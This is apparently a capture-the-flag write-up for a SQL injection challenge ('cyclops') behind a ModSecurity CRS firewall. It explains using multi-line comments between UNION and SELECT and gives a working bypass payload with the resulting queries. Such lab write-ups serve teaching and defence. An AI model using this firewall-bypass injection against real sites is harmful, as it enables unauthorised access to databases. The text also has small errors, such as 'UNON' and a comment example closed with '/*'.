---
custom_edit_url: null
sidebar_position: 36
tags: [SQLi, Multi-line comment, MOD Security CRS, WAF bypass]
---

![1](https://github.com/Kunull/Write-ups/assets/110326359/a0890124-fcbf-4ebc-a6fd-dc8011043f59)

We are provided with the SQL query:

```sql
SELECT id,pw FROM prob_cyclops WHERE id='{$_GET[id]}' AND pw='{$_GET[pw]}'
```

In this challenge as well, the Mod Security CRS is being used.
For this challenge, we have to use the `UNON SELECT` statement.

Let's try that by providing the following URI parameter:

```
?id=UNION SELECT
```

The resultant query becomes:

```sql
SELECT id,pw FROM prob_cyclops WHERE id='' UNION SELECT '' AND pw=''
```

![2](https://github.com/Kunull/Write-ups/assets/110326359/79303dfd-43e3-4524-af78-e1019ef5e2a2)

As we can see, the input gets blocked.
In order to get around this we have to use multi-line comments.

&nbsp;

## Multi-line comments

In SQL, multi-line comments are effective while commenting out large groups of text.

```sql
SELECT * FROM table
/*
SELECT * FROM table
SELECT * FROM table
/*
```

We can utilize this to introduce space between the `UNION` and `SELECT` words as such:

```sql
UNION
/*
*/
SELECT
```

In order to get around the MOD Security filter, we can use the previously used bypass and modify it to our needs. We need to select the `first` and `second` columns in order to solve this challenge.

If we provide the following URI parameter:

```
?id=-1'<@=1 UNION/**/SELECT 'first','second' -- -
```

The resultant query becomes:

```sql
SELECT id,pw FROM prob_cyclops WHERE id='-1'<@=1 UNION
/*
*/
SELECT 'first','second' -- -' AND pw=''
```

![3](https://github.com/Kunull/Write-ups/assets/110326359/ff3d51a5-66d4-408b-a2b1-923d945dc379)
